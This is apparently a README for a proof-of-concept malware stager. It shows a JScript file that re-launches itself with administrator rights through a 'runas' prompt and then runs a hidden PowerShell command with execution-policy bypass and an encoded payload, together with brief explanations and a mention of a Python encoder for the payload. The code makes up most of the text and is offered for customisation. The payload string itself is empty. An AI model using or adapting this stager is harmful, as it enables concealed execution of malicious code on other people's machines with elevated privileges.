#### Overview

in this (POC) is a main poc.js file witch is the main 
stager and can be customized to your liking.

the poc.py is a local encoder witch encodes the (UTF-16LE)
to the js payload.

#### How it happens

```javascript
function EnsureElevatedPrivilages() {
    if (!WScript.Arguments.Named.Exists("elevate")) {
        var shellApp = new ActiveXObject("Shell.Application");
        shellApp.ShellExecute(WScript.FullName, "\"" + WScript.ScriptFullName + "\" /elevate", "", "runas", 1);
        WScript.Quit();
    }
}

EnsureElevatedPrivilages();

var WshShell = new ActiveXObject("WScript.Shell");
WshShell.Run("powershell -NoP -Ep Bypass -enc  ", 0, false);

WScript.Quit();
```

```javascript
var WshShell = new ActiveXObject("WScript.Shell");
WshShell.Run("powershell -NoP -Ep Bypass -enc  ", 0, false);
```

this is the main execution of the staged powershell payload
and again witch is encoded in (UTF-16LE).

---

```javascript
function EnsureElevatedPrivilages() {
    if (!WScript.Arguments.Named.Exists("elevate")) {
        var shellApp = new ActiveXObject("Shell.Application");
        shellApp.ShellExecute(WScript.FullName, "\"" + WScript.ScriptFullName + "\" /elevate", "", "runas", 1);
        WScript.Quit();
    }
}
```
this function checks to see if the program itself is 
running as administrator if not it reruns itself
as administrator.

simply it just propmts for admin privs.

